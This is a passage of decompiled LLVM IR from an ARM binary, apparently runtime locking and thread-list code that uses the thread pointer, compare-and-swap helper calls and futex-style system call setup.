  store i32 %v1_126f8, i32* %r2.global-to-local, align 4
  %v1_126fc132 = inttoptr i32 %v1_126f8 to i32*
  %v2_126fc133 = load i32, i32* %v1_126fc132, align 4
  store i32 %v2_126fc133, i32* %r3.global-to-local, align 4
  %v3_12700135 = icmp uge i32 %v2_126fc133, %v3_126e0
  store i1 %v3_12700135, i1* %cpsr_c.global-to-local, align 1
  %v9_12700141 = icmp eq i32 %v2_126fc133, %v3_126e0
  br i1 %v9_12700141, label %dec_label_pc_12708, label %dec_label_pc_12720

dec_label_pc_12708:                               ; preds = %dec_label_pc_126f4, %dec_label_pc_12708.dec_label_pc_126fc_crit_edge
  %v0_12708142 = phi i32 [ %v1_12700.pre, %dec_label_pc_12708.dec_label_pc_126fc_crit_edge ], [ %v3_126e0, %dec_label_pc_126f4 ]
  store i32 %v0_12708142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_12718 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_12718, label %dec_label_pc_1271c, label %dec_label_pc_12708.dec_label_pc_126fc_crit_edge

dec_label_pc_12708.dec_label_pc_126fc_crit_edge:  ; preds = %dec_label_pc_12708
  %v0_126fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12700.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_126fc = inttoptr i32 %v0_126fc.pre to i32*
  %v2_126fc = load i32, i32* %v1_126fc, align 4
  store i32 %v2_126fc, i32* %r3.global-to-local, align 4
  %v3_12700 = icmp uge i32 %v2_126fc, %v1_12700.pre
  store i1 %v3_12700, i1* %cpsr_c.global-to-local, align 1
  %v9_12700 = icmp eq i32 %v2_126fc, %v1_12700.pre
  br i1 %v9_12700, label %dec_label_pc_12708, label %dec_label_pc_12720

dec_label_pc_1271c:                               ; preds = %dec_label_pc_12708
  %v0_1271c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1271c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12720

dec_label_pc_12720:                               ; preds = %dec_label_pc_126f4, %dec_label_pc_12708.dec_label_pc_126fc_crit_edge, %dec_label_pc_1271c
  %v0_12720 = phi i32 [ %v0_1271c, %dec_label_pc_1271c ], [ %v2_126fc133, %dec_label_pc_126f4 ], [ %v2_126fc, %dec_label_pc_12708.dec_label_pc_126fc_crit_edge ]
  %v1_12720 = phi i32 [ %v0_1271c, %dec_label_pc_1271c ], [ %v3_126e0, %dec_label_pc_126f4 ], [ %v1_12700.pre, %dec_label_pc_12708.dec_label_pc_126fc_crit_edge ]
  %v3_12720 = icmp uge i32 %v0_12720, %v1_12720
  store i1 %v3_12720, i1* %cpsr_c.global-to-local, align 1
  %v9_12720 = icmp eq i32 %v0_12720, %v1_12720
  br i1 %v9_12720, label %dec_label_pc_12728, label %dec_label_pc_127a4.backedge

dec_label_pc_12728:                               ; preds = %dec_label_pc_12720
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1273c = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_1272c

dec_label_pc_1272c:                               ; preds = %dec_label_pc_12794, %dec_label_pc_12728
  %v0_1272c = load i32, i32* %r7.global-to-local, align 4
  %v1_1272c = add i32 %v0_1272c, 4
  %v2_1272c = inttoptr i32 %v1_1272c to i32*
  %v3_1272c = load i32, i32* %v2_1272c, align 4
  store i32 %v3_1272c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12730 = icmp eq i32 %v3_1272c, 0
  br i1 %v2_12730, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_1272c
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_1272c, %bb
  %v2_12738 = xor i1 %v2_12730, true
  call void @__pseudo_cond_branch(i1 %v2_12738, i32 %v3_1272c)
  %v0_12740 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_12740, i32* %stack_var_-88, align 4
  %v1_12744 = inttoptr i32 %v0_12740 to i32*
  %v2_12744 = load i32, i32* %v1_12744, align 4
  store i32 %v2_12744, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12748 = icmp eq i32 %v2_12744, 0
  store i32 %v2_1273c, i32* %r5.global-to-local, align 4
  br i1 %v2_12748, label %dec_label_pc_127b4.loopexit, label %dec_label_pc_1275c

dec_label_pc_1275c:                               ; preds = %bb72
  %v1_1275c = add i32 %v2_12744, 20
  store i32 %v1_1275c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12760

dec_label_pc_12760:                               ; preds = %dec_label_pc_12794.dec_label_pc_12760_crit_edge, %dec_label_pc_1275c
  %v0_12764 = phi i32 [ %v0_12764.pre, %dec_label_pc_12794.dec_label_pc_12760_crit_edge ], [ %v1_1275c, %dec_label_pc_1275c ]
  %v0_12760 = phi i32 [ %v0_12760.pre, %dec_label_pc_12794.dec_label_pc_12760_crit_edge ], [ %v2_12744, %dec_label_pc_1275c ]
  %v1_12760 = add i32 %v0_12760, 20
  %v2_12760 = inttoptr i32 %v1_12760 to i32*
  %v3_12760 = load i32, i32* %v2_12760, align 4
  store i32 %v0_12764, i32* %r2.global-to-local, align 4
  store i32 %v3_12760, i32* %r4.global-to-local, align 4
  %v1_12770119 = inttoptr i32 %v0_12764 to i32*
  %v2_12770120 = load i32, i32* %v1_12770119, align 4
  store i32 %v2_12770120, i32* %r3.global-to-local, align 4
  %v3_12774122 = icmp uge i32 %v2_12770120, %v3_12760
  store i1 %v3_12774122, i1* %cpsr_c.global-to-local, align 1
  %v9_12774128 = icmp eq i32 %v2_12770120, %v3_12760
  br i1 %v9_12774128, label %dec_label_pc_1277c, label %dec_label_pc_12794

dec_label_pc_1277c:                               ; preds = %dec_label_pc_12760, %dec_label_pc_1277c.dec_label_pc_12770_crit_edge
  %v0_1277c129 = phi i32 [ %v1_12774.pre, %dec_label_pc_1277c.dec_label_pc_12770_crit_edge ], [ %v3_12760, %dec_label_pc_12760 ]
  store i32 %v0_1277c129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1278c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1278c, label %dec_label_pc_12790, label %dec_label_pc_1277c.dec_label_pc_12770_crit_edge

dec_label_pc_1277c.dec_label_pc_12770_crit_edge:  ; preds = %dec_label_pc_1277c
  %v0_12770.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12774.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_12770 = inttoptr i32 %v0_12770.pre to i32*
  %v2_12770 = load i32, i32* %v1_12770, align 4
  store i32 %v2_12770, i32* %r3.global-to-local, align 4
  %v3_12774 = icmp uge i32 %v2_12770, %v1_12774.pre
  store i1 %v3_12774, i1* %cpsr_c.global-to-local, align 1
  %v9_12774 = icmp eq i32 %v2_12770, %v1_12774.pre
  br i1 %v9_12774, label %dec_label_pc_1277c, label %dec_label_pc_12794

dec_label_pc_12790:                               ; preds = %dec_label_pc_1277c
  %v0_12790 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12790, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12794

dec_label_pc_12794:                               ; preds = %dec_label_pc_12760, %dec_label_pc_1277c.dec_label_pc_12770_crit_edge, %dec_label_pc_12790
  %v0_12794 = phi i32 [ %v0_12790, %dec_label_pc_12790 ], [ %v2_12770120, %dec_label_pc_12760 ], [ %v2_12770, %dec_label_pc_1277c.dec_label_pc_12770_crit_edge ]
  %v1_12794 = phi i32 [ %v0_12790, %dec_label_pc_12790 ], [ %v3_12760, %dec_label_pc_12760 ], [ %v1_12774.pre, %dec_label_pc_1277c.dec_label_pc_12770_crit_edge ]
  %v3_12794 = icmp uge i32 %v0_12794, %v1_12794
  store i1 %v3_12794, i1* %cpsr_c.global-to-local, align 1
  %v9_12794 = icmp eq i32 %v0_12794, %v1_12794
  store i32 %v2_1273c, i32* %r4.global-to-local, align 4
  br i1 %v9_12794, label %dec_label_pc_1272c, label %dec_label_pc_12794.dec_label_pc_12760_crit_edge

dec_label_pc_12794.dec_label_pc_12760_crit_edge:  ; preds = %dec_label_pc_12794
  %v0_12760.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_12764.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12760

dec_label_pc_127b0:                               ; preds = %dec_label_pc_127a4.backedge, %entry
  %v0_127b831 = phi i32 [ ptrtoint (i32* @global_var_20d14.594 to i32), %entry ], [ %v0_127a4, %dec_label_pc_127a4.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_127b4

dec_label_pc_127b4.loopexit:                      ; preds = %bb72
  store i32 %v2_1273c, i32* %r6.global-to-local, align 4
  %v0_127b8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_127b4

dec_label_pc_127b4:                               ; preds = %dec_label_pc_127b4.loopexit, %dec_label_pc_127b0
  %v0_127b8 = phi i32 [ %v0_127b8.pre, %dec_label_pc_127b4.loopexit ], [ %v0_127b831, %dec_label_pc_127b0 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_127b8 = add i32 %v0_127b8, 152
  %v3_127b8 = inttoptr i32 %v2_127b8 to i32*
  %v4_127b8 = load i32, i32* %v3_127b8, align 4
  store i32 %v4_127b8, i32* %r7.global-to-local, align 4
  %v0_127bc = call i32 @__aeabi_read_tp()
  store i32 %v0_127bc, i32* %r0.global-to-local, align 4
  %v1_127c0 = add i32 %v4_127b8, 8
  %v2_127c0 = inttoptr i32 %v1_127c0 to i32*
  %v3_127c0 = load i32, i32* %v2_127c0, align 4
  store i32 %v3_127c0, i32* %r3.global-to-local, align 4
  %v1_127c4 = add i32 %v0_127bc, -1168
  store i32 %v1_127c4, i32* %r5.global-to-local, align 4
  %v3_127c8 = icmp uge i32 %v3_127c0, %v1_127c4
  store i1 %v3_127c8, i1* %cpsr_c.global-to-local, align 1
  %v9_127c8 = icmp eq i32 %v3_127c0, %v1_127c4
  br i1 %v9_127c8, label %dec_label_pc_12930, label %dec_label_pc_127d0

dec_label_pc_127d0:                               ; preds = %dec_label_pc_127b4
  store i32 %v4_127b8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_127dc112 = inttoptr i32 %v4_127b8 to i32*
  %v2_127dc113 = load i32, i32* %v1_127dc112, align 4
  store i32 %v2_127dc113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_127e0115 = icmp eq i32 %v2_127dc113, 0
  br i1 %v9_127e0115, label %dec_label_pc_127e8, label %dec_label_pc_12800

dec_label_pc_127e8:                               ; preds = %dec_label_pc_127d0, %dec_label_pc_127e8.dec_label_pc_127dc_crit_edge
  %v0_127e8116 = phi i32 [ %v1_127e0.pre, %dec_label_pc_127e8.dec_label_pc_127dc_crit_edge ], [ 0, %dec_label_pc_127d0 ]
  store i32 %v0_127e8116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_127f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_127f8, label %dec_label_pc_127fc, label %dec_label_pc_127e8.dec_label_pc_127dc_crit_edge

dec_label_pc_127e8.dec_label_pc_127dc_crit_edge:  ; preds = %dec_label_pc_127e8
  %v0_127dc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_127e0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_127dc = inttoptr i32 %v0_127dc.pre to i32*
  %v2_127dc = load i32, i32* %v1_127dc, align 4
  store i32 %v2_127dc, i32* %r3.global-to-local, align 4
  %v3_127e0 = icmp uge i32 %v2_127dc, %v1_127e0.pre
  store i1 %v3_127e0, i1* %cpsr_c.global-to-local, align 1
  %v9_127e0 = icmp eq i32 %v2_127dc, %v1_127e0.pre
  br i1 %v9_127e0, label %dec_label_pc_127e8, label %dec_label_pc_12800

dec_label_pc_127fc:                               ; preds = %dec_label_pc_127e8
  %v0_127fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_127fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12800

dec_label_pc_12800:                               ; preds = %dec_label_pc_127d0, %dec_label_pc_127e8.dec_label_pc_127dc_crit_edge, %dec_label_pc_127fc
  %v0_12800 = phi i32 [ %v0_127fc, %dec_label_pc_127fc ], [ %v2_127dc113, %dec_label_pc_127d0 ], [ %v2_127dc, %dec_label_pc_127e8.dec_label_pc_127dc_crit_edge ]
  %v1_12800 = phi i32 [ %v0_127fc, %dec_label_pc_127fc ], [ 0, %dec_label_pc_127d0 ], [ %v1_127e0.pre, %dec_label_pc_127e8.dec_label_pc_127dc_crit_edge ]
  %v3_12800 = icmp uge i32 %v0_12800, %v1_12800
  store i1 %v3_12800, i1* %cpsr_c.global-to-local, align 1
  %v9_12800 = icmp eq i32 %v0_12800, %v1_12800
  br i1 %v9_12800, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_12800
  %v1_12804 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_12804, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_12800, %bb73
  %v1_12808 = xor i1 %v9_12800, true
  call void @__pseudo_cond_branch(i1 %v1_12808, i32 ptrtoint (i32* @global_var_12a80.726 to i32))
  %v0_1280c = load i32, i32* %r5.global-to-local, align 4
  %v1_1280c = load i32, i32* %r7.global-to-local, align 4
  %v2_1280c = add i32 %v1_1280c, 8
  %v3_1280c = inttoptr i32 %v2_1280c to i32*
  store i32 %v0_1280c, i32* %v3_1280c, align 4
  br label %dec_label_pc_12930

dec_label_pc_12930:                               ; preds = %bb74, %dec_label_pc_127b4
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_12814 = load i32, i32* %r8.global-to-local, align 4
  %v2_12814 = add i32 %v0_12814, 152
  %v3_12814 = inttoptr i32 %v2_12814 to i32*
  %v4_12814 = load i32, i32* %v3_12814, align 4
  store i32 %v4_12814, i32* %r2.global-to-local, align 4
  %v1_12818 = add i32 %v4_12814, 4
  %v2_12818 = inttoptr i32 %v1_12818 to i32*
  %v3_12818 = load i32, i32* %v2_12818, align 4
  %v1_1281c = add i32 %v3_12818, 1
  store i32 %v1_1281c, i32* %r3.global-to-local, align 4
  store i32 %v1_1281c, i32* %v2_12818, align 4
  %v0_12824 = load i32, i32* %r5.global-to-local, align 4
  %v1_12824 = add i32 %v0_12824, 108
  %v2_12824 = inttoptr i32 %v1_12824 to i32*
  %v3_12824 = load i32, i32* %v2_12824, align 4
  store i32 %v3_12824, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_1282c = sub i32 0, %v3_12824
  store i32 %v1_1282c, i32* %v2_12824, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_12840 = load i32, i32* %r5.global-to-local, align 4
  %v1_12840 = add i32 %v0_12840, 104
  store i32 %v1_12840, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_12934.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_12934 = add i32 %v0_12840, 108
  %v3_12934 = inttoptr i32 %v2_12934 to i32*
  store i32 %v0_12934.pre, i32* %v3_12934, align 4
  %v0_12938 = load i32, i32* %r8.global-to-local, align 4
  %v1_12938 = load i32, i32* %r3.global-to-local, align 4
  %v2_12938 = add i32 %v1_12938, %v0_12938
  %v3_12938 = inttoptr i32 %v2_12938 to i32*
  %v4_12938 = load i32, i32* %v3_12938, align 4
  store i32 %v4_12938, i32* %r0.global-to-local, align 4
  %v1_1293c = add i32 %v4_12938, 4
  %v2_1293c = inttoptr i32 %v1_1293c to i32*
  %v3_1293c = load i32, i32* %v2_1293c, align 4
  %v1_12940 = add i32 %v3_1293c, -1
  store i32 %v1_12940, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12944 = icmp eq i32 %v1_12940, 0
  store i32 %v1_12940, i32* %v2_1293c, align 4
  br i1 %v2_12944, label %dec_label_pc_12950, label %dec_label_pc_12a40thread-pre-split

dec_label_pc_12950:                               ; preds = %dec_label_pc_12930
  %v0_12950 = load i32, i32* %r3.global-to-local, align 4
  %v1_12950 = load i32, i32* %r0.global-to-local, align 4
  %v2_12950 = add i32 %v1_12950, 8
  %v3_12950 = inttoptr i32 %v2_12950 to i32*
  store i32 %v0_12950, i32* %v3_12950, align 4
  %v0_12954 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12954, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12958

dec_label_pc_12958:                               ; preds = %dec_label_pc_12988.dec_label_pc_12958_crit_edge, %dec_label_pc_12950
  %v0_12958 = phi i32 [ %v0_12958.pre, %dec_label_pc_12988.dec_label_pc_12958_crit_edge ], [ %v0_12954, %dec_label_pc_12950 ]
  %v1_12958 = inttoptr i32 %v0_12958 to i32*
  %v2_12958 = load i32, i32* %v1_12958, align 4
  store i32 %v2_12958, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_12958, i32* %r2.global-to-local, align 4
  %v2_12964100 = load i32, i32* %v1_12958, align 4
  store i32 %v2_12964100, i32* %r3.global-to-local, align 4
  %v3_12968102 = icmp uge i32 %v2_12964100, %v2_12958
  store i1 %v3_12968102, i1* %cpsr_c.global-to-local, align 1
  %v9_12968108 = icmp eq i32 %v2_12964100, %v2_12958
  br i1 %v9_12968108, label %dec_label_pc_12970, label %dec_label_pc_12988

dec_label_pc_12970:                               ; preds = %dec_label_pc_12958, %dec_label_pc_12970.dec_label_pc_12964_crit_edge
  %v0_12970109 = phi i32 [ %v1_12968.pre, %dec_label_pc_12970.dec_label_pc_12964_crit_edge ], [ %v2_12958, %dec_label_pc_12958 ]
  store i32 %v0_12970109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_12980 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_12980, label %dec_label_pc_12984, label %dec_label_pc_12970.dec_label_pc_12964_crit_edge

dec_label_pc_12970.dec_label_pc_12964_crit_edge:  ; preds = %dec_label_pc_12970
  %v0_12964.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12968.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_12964 = inttoptr i32 %v0_12964.pre to i32*
  %v2_12964 = load i32, i32* %v1_12964, align 4
  store i32 %v2_12964, i32* %r3.global-to-local, align 4
  %v3_12968 = icmp uge i32 %v2_12964, %v1_12968.pre
  store i1 %v3_12968, i1* %cpsr_c.global-to-local, align 1
  %v9_12968 = icmp eq i32 %v2_12964, %v1_12968.pre
  br i1 %v9_12968, label %dec_label_pc_12970, label %dec_label_pc_12988

dec_label_pc_12984:                               ; preds = %dec_label_pc_12970
  %v0_12984 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12984, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12988

dec_label_pc_12988:                               ; preds = %dec_label_pc_12958, %dec_label_pc_12970.dec_label_pc_12964_crit_edge, %dec_label_pc_12984
  %v0_12990 = phi i32 [ %v0_12984, %dec_label_pc_12984 ], [ %v2_12964100, %dec_label_pc_12958 ], [ %v2_12964, %dec_label_pc_12970.dec_label_pc_12964_crit_edge ]
  %v1_12988 = phi i32 [ %v0_12984, %dec_label_pc_12984 ], [ %v2_12958, %dec_label_pc_12958 ], [ %v1_12968.pre, %dec_label_pc_12970.dec_label_pc_12964_crit_edge ]
  %v3_12988 = icmp uge i32 %v0_12990, %v1_12988
  store i1 %v3_12988, i1* %cpsr_c.global-to-local, align 1
  %v9_12988 = icmp eq i32 %v0_12990, %v1_12988
  br i1 %v9_12988, label %dec_label_pc_12990, label %dec_label_pc_12988.dec_label_pc_12958_crit_edge

dec_label_pc_12988.dec_label_pc_12958_crit_edge:  ; preds = %dec_label_pc_12988
  %v0_12958.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12958

dec_label_pc_12990:                               ; preds = %dec_label_pc_12988
  %v2_12990 = icmp ne i32 %v1_12988, 0
  store i1 %v2_12990, i1* %cpsr_c.global-to-local, align 1
  %v7_12994 = icmp slt i32 %v1_12988, 2
  br i1 %v7_12994, label %dec_label_pc_12a40thread-pre-split, label %dec_label_pc_12998

dec_label_pc_12998:                               ; preds = %dec_label_pc_12990
  %v0_12998 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12998, i32* %r0.global-to-local, align 4
  %v0_1299c = load i32, i32* @r1, align 4
  %v1_1299c = add i32 %v0_1299c, 129
  store i32 %v1_1299c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12a40thread-pre-split

dec_label_pc_129b4:                               ; preds = %dec_label_pc_12a40thread-pre-split, %dec_label_pc_12a3c
  %v0_129b4 = phi i32 [ %v3_12a3c, %dec_label_pc_12a3c ], [ %v0_12a40.pr, %dec_label_pc_12a40thread-pre-split ]
  %v1_129b4 = inttoptr i32 %v0_129b4 to i32*
  %v2_129b4 = load i32, i32* %v1_129b4, align 4
  store i32 %v2_129b4, i32* %r3.global-to-local, align 4
  %v1_129b8 = add i32 %v2_129b4, 8
  %v2_129b8 = inttoptr i32 %v1_129b8 to i32*
  %v3_129b8 = load i32, i32* %v2_129b8, align 4
  store i32 %v3_129b8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_129bc = icmp eq i32 %v3_129b8, 0
  br i1 %v2_129bc, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_129b4
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_129b4, %bb75
  %v2_129c4 = xor i1 %v2_129bc, true
  call void @__pseudo_cond_branch(i1 %v2_129c4, i32 %v3_129b8)
  %v0_129c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_129c8 = inttoptr i32 %v0_129c8 to i32*
  %v2_129c8 = load i32, i32* %v1_129c8, align 4
  store i32 %v2_129c8, i32* %r5.global-to-local, align 4
  %v1_129cc = add i32 %v2_129c8, 20
  store i32 %v1_129cc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_129d0

dec_label_pc_129d0:                               ; preds = %dec_label_pc_12a04.dec_label_pc_129d0_crit_edge, %bb76
  %v0_129d4 = phi i32 [ %v0_129d4.pre, %dec_label_pc_12a04.dec_label_pc_129d0_crit_edge ], [ %v1_129cc, %bb76 ]
  %v0_129d0 = phi i32 [ %v0_129d0.pre, %dec_label_pc_12a04.dec_label_pc_129d0_crit_edge ], [ %v2_129c8, %bb76 ]
  %v1_129d0 = add i32 %v0_129d0, 20
  %v2_129d0 = inttoptr i32 %v1_129d0 to i32*
  %v3_129d0 = load i32, i32* %v2_129d0, align 4
  store i32 %v0_129d4, i32* %r2.global-to-local, align 4
  store i32 %v3_129d0, i32* %r4.global-to-local, align 4
  %v1_129dc = add i32 %v3_129d0, -1
  store i32 %v1_129dc, i32* @r1, align 4
  %v1_129e087 = inttoptr i32 %v0_129d4 to i32*
  %v2_129e088 = load i32, i32* %v1_129e087, align 4
  store i32 %v2_129e088, i32* %r3.global-to-local, align 4
  %v3_129e490 = icmp uge i32 %v2_129e088, %v3_129d0
  store i1 %v3_129e490, i1* %cpsr_c.global-to-local, align 1
  %v9_129e496 = icmp eq i32 %v2_129e088, %v3_129d0
  br i1 %v9_129e496, label %dec_label_pc_129ec, label %dec_label_pc_12a04

dec_label_pc_129ec:                               ; preds = %dec_label_pc_129d0, %dec_label_pc_129ec.dec_label_pc_129e0_crit_edge
  %v0_129ec97 = phi i32 [ %v1_129e4.pre, %dec_label_pc_129ec.dec_label_pc_129e0_crit_edge ], [ %v3_129d0, %dec_label_pc_129d0 ]
  store i32 %v0_129ec97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_129fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_129fc, label %dec_label_pc_12a00, label %dec_label_pc_129ec.dec_label_pc_129e0_crit_edge

dec_label_pc_129ec.dec_label_pc_129e0_crit_edge:  ; preds = %dec_label_pc_129ec
  %v0_129e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_129e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_129e0 = inttoptr i32 %v0_129e0.pre to i32*
  %v2_129e0 = load i32, i32* %v1_129e0, align 4
  store i32 %v2_129e0, i32* %r3.global-to-local, align 4
  %v3_129e4 = icmp uge i32 %v2_129e0, %v1_129e4.pre
  store i1 %v3_129e4, i1* %cpsr_c.global-to-local, align 1
  %v9_129e4 = icmp eq i32 %v2_129e0, %v1_129e4.pre
  br i1 %v9_129e4, label %dec_label_pc_129ec, label %dec_label_pc_12a04

dec_label_pc_12a00:                               ; preds = %dec_label_pc_129ec
  %v0_12a00 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12a00, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12a04

dec_label_pc_12a04:                               ; preds = %dec_label_pc_129d0, %dec_label_pc_129ec.dec_label_pc_129e0_crit_edge, %dec_label_pc_12a00
  %v0_12a10 = phi i32 [ %v0_12a00, %dec_label_pc_12a00 ], [ %v2_129e088, %dec_label_pc_129d0 ], [ %v2_129e0, %dec_label_pc_129ec.dec_label_pc_129e0_crit_edge ]
  %v1_12a04 = phi i32 [ %v0_12a00, %dec_label_pc_12a00 ], [ %v3_129d0, %dec_label_pc_129d0 ], [ %v1_129e4.pre, %dec_label_pc_129ec.dec_label_pc_129e0_crit_edge ]
  %v3_12a04 = icmp uge i32 %v0_12a10, %v1_12a04
  store i1 %v3_12a04, i1* %cpsr_c.global-to-local, align 1
  %v9_12a04 = icmp eq i32 %v0_12a10, %v1_12a04
  store i32 %v0_12a10, i32* %r2.global-to-local, align 4
  br i1 %v9_12a04, label %dec_label_pc_12a10, label %dec_label_pc_12a04.dec_label_pc_129d0_crit_edge

dec_label_pc_12a04.dec_label_pc_129d0_crit_edge:  ; preds = %dec_label_pc_12a04
  %v0_129d0.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_129d4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_129d0

dec_label_pc_12a10:                               ; preds = %dec_label_pc_12a04
  %v2_12a10 = icmp ne i32 %v1_12a04, 0
  store i1 %v2_12a10, i1* %cpsr_c.global-to-local, align 1
  %v7_12a10 = icmp eq i32 %v1_12a04, 1
  %v0_12a18 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_12a10, label %dec_label_pc_12a18, label %dec_label_pc_12a3c

dec_label_pc_12a18:                               ; preds = %dec_label_pc_12a10
  %v1_12a18 = inttoptr i32 %v0_12a18 to i32*
  %v2_12a18 = load i32, i32* %v1_12a18, align 4
  store i32 %v2_12a18, i32* @r1, align 4
  %v1_12a1c = add i32 %v2_12a18, 24
  %v2_12a1c = inttoptr i32 %v1_12a1c to i32*
  %v3_12a1c = load i32, i32* %v2_12a1c, align 4
  store i32 %v3_12a1c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12a20 = icmp eq i32 %v3_12a1c, 0
  br i1 %v2_12a20, label %dec_label_pc_12a3c, label %dec_label_pc_12a28

dec_label_pc_12a28:                               ; preds = %dec_label_pc_12a18
  %v1_12a28 = add i32 %v2_12a18, 20
  %v2_12a28 = inttoptr i32 %v1_12a28 to i32*
  %v3_12a28 = load i32, i32* %v2_12a28, align 4
  store i32 %v3_12a28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12a3c

dec_label_pc_12a3c:                               ; preds = %dec_label_pc_12a10, %dec_label_pc_12a28, %dec_label_pc_12a18
  %v1_12a3c = add i32 %v0_12a18, 4
  %v2_12a3c = inttoptr i32 %v1_12a3c to i32*
  %v3_12a3c = load i32, i32* %v2_12a3c, align 4
  store i32 %v3_12a3c, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12a40 = icmp eq i32 %v3_12a3c, 0
  br i1 %v2_12a40, label %dec_label_pc_12a48, label %dec_label_pc_129b4

dec_label_pc_12a40thread-pre-split:               ; preds = %dec_label_pc_12998, %dec_label_pc_12990, %dec_label_pc_12930
  %v0_12a40.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12a4011 = icmp eq i32 %v0_12a40.pr, 0
  br i1 %v2_12a4011, label %dec_label_pc_12a48, label %dec_label_pc_129b4

dec_label_pc_12a48:                               ; preds = %dec_label_pc_12a3c, %dec_label_pc_12a40thread-pre-split
  %v0_12a48.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12a48.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_12a48.pre

; uselistorder directives
  uselistorder i32 %v0_12a40.pr, { 1, 0 }
  uselistorder i32 %v3_12a3c, { 1, 2, 0 }
  uselistorder i32 %v1_12a04, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12a00, { 1, 0, 2 }
  uselistorder i32 %v1_129e4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_12984, { 1, 0, 2 }
